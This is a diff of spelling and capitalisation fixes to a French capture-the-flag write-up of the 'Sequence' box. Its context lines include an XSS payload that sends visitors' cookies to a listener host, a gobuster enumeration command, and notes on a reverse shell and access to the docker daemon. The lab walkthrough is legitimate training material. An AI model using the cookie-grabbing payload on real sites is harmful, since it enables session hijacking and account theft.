@@ -11,7 +11,7 @@ tableOfContents: false
 
 # Sequence
 
-La box sequence consiste en l'enchainement de plusieurs vulnérabilités web pour prendre le contrôle total d'une machine.
+La box Sequence consiste en l'enchainement de plusieurs vulnérabilités web pour prendre le contrôle total d'une machine.
 
 ## Port Enum
 
@@ -32,7 +32,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-Nous avons donc une application web et un service SSH : concentrons nous sur l'application web.
+Nous avons donc une application web et un service SSH : concentrons-nous sur l'application web.
 
 ### Compromission du modérateur
 
@@ -40,7 +40,7 @@ L'interface web nous montre :
 - Un formulaire de contact
 - Une page de connexion
 
-nous allons commencer par essayer de voler le cookie d'un modérateur ou d'un adminsitrateur :
+Nous allons commencer par essayer de voler le cookie d'un modérateur ou d'un administrateur :
 
 ```bash
 <script>document.location='http://10.81.76.213:8888/XSS/grabber.php?c='+document.cookie</script>
@@ -73,7 +73,7 @@ L'admin clique bien sur le lien et on récupère alors le deuxième flag.
 
 ## Reverse Shell
 
-Après cela, nous avons accès à un nouveau dashboard qui inclut un fichier lottery.php. Cependant il n'est pas possible d'exploiter cette inclusion pour inclure des fichiers sensibles. nous allons donc repasser dans une phase d'énumération avec gobuster et nikto : 
+Après cela, nous avons accès à un nouveau dashboard qui inclut un fichier lottery.php. Cependant il n'est pas possible d'exploiter cette inclusion pour inclure des fichiers sensibles. Nous allons donc repasser dans une phase d'énumération avec gobuster et nikto : 
 ```bash
 gobuster dir -u http://review.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
 ===============================================================
@@ -193,7 +193,7 @@ On observe plusieurs choses dans ce terminal :
 - il y a un fichier .dockerenv à la racine
 - Nous sommes `root`
 
-nous sommes donc dans un container.  et on observe que nous avons accès à la commande docker et au docker daemon : 
+Nous sommes donc dans un container. Et on observe que nous avons accès à la commande docker et au docker daemon : 
 
 ```bash
 # docker ps 
